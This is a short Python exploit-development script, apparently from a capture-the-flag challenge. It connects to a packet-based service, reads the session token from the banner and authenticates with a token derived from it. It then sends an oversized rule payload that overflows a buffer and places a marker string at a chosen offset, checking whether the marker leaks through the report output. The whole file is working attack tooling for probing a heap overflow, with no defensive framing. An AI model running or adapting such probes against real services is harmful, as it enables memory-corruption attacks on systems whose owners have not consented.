import socket, struct, sys, re, time
sys.path.insert(0, __file__.rsplit("\\",1)[0])
import client

HOST, PORT = sys.argv[1], int(sys.argv[2])
off = int(sys.argv[3])

s = socket.create_connection((HOST, PORT))
banner = client.rd(s, 1.5)
m = re.search(rb"session token: ([0-9a-f]{8})", banner)
client.TOKEN = int(m.group(1), 16)
tok = client.TOKEN
C = 0x5a5a5a5a41414141
tok12 = (tok & 0xffffffff) << 12

def pkt(ptype, payload, t=1.2):
    client.send_packet(s, ptype, payload)
    return client.rd(s, t)

pkt(2, struct.pack("<I", (tok ^ 0xc0ffee00) & 0xffffffff))
# rule slot
rule_payload = struct.pack("<H", 1) + b"A"
pkt(3, rule_payload)
# report create, same len
pkt(4, b"\x00\x00\x00")

# overflow: place marker string at 'off'
MARKER = b"ABCDEFGHIJKLMNOPQRST"
rlen = off + len(MARKER)
ov = bytearray(rlen)
ov[off:off+len(MARKER)] = MARKER
payload = struct.pack("<H", rlen) + bytes(ov)
pkt(3, payload)

# ANALYZE -> print_report prints msg at report+0x28
r = pkt(5, b"")
found = MARKER[:8] in r
print(f"off={hex(off)} rlen={hex(rlen)} found_marker={found} resp={r!r}")
s.close()
